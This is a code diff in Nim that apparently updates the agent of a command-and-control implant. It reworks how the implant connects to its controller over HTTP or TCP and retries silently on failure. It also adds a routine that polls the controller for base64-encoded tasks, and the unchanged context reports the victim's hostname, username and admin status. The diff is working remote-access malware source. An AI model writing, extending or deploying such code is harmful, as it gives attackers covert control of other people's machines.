@@ -1,4 +1,4 @@
-import std/[base64, json]
+import std/[base64, json, os]
 
 when defined(tcp):
   import std/net
@@ -9,6 +9,7 @@ import types
 
 proc sendData(app: App, data: string) =
   when defined(tcp):
+    echo "sending " & data
     app.socket.send(encode(data) & "\r\n")
   elif defined(http):
     try:
@@ -83,22 +84,26 @@ proc identify*(app: App, taskId: int, hostname: string, isAdmin: bool, username:
   app.sendData($j)
 
 proc connectToC2*(app: App) =
+  let j = %*{
+    "task": "connect",
+    "taskId": -1,
+    "error": "",
+    "data": {}
+  }
+
   when defined(http):
     try:
       let token = app.httpClient.getContent(app.httpRoot & "/r")
       app.token = token
-      when defined(debug):
-        echo "got token: " & token
+      app.sendData($j)
+    except OSError: discard
+  elif defined(tcp):
+    try:
+      app.socket = newSocket()
+      app.socket.connect(app.ip, Port(app.port))
+      app.sendData($j)
     except OSError:
-      return
-  let j = %*
-    {
-      "task": "connect",
-      "taskId": -1,
-      "error": "",
-      "data": {}
-    }
-  app.sendData($j)
+      sleep(app.autoConnectTime)
 
 proc unknownTask*(app: App, taskId: int, taskName: string) =
   let j = %*
@@ -130,3 +135,29 @@ proc newTaskOutput*(taskId: int): TaskOutput =
     error: "",
     data: %*{}
   )
+
+proc fetchTasks*(app: App): JsonNode =
+  when defined(tcp):
+    app.socket.send("tasksplz\r\n")
+    echo "waiting for tasks.."
+    let line = app.socket.recvLine()
+    echo "received: " & line
+    if line.len == 0:
+      app.socket.close()
+    let decoded = decode(line)
+    result = parseJson(decoded)
+  elif defined(http):
+    var httpResponse: string
+    var fail = false
+    try:
+      httpResponse = app.httpClient.getContent(app.httpRoot & "/t?id=" & app.token)
+    except OSError:
+      when defined(debug):
+        echo getCurrentExceptionMsg()
+      app.httpClient = newHttpClient()
+      fail = true
+    except HttpRequestError:
+      app.connectToC2()
+      fail = true
+    if fail: return %*[]
+    result = parseJson(decode(httpResponse))
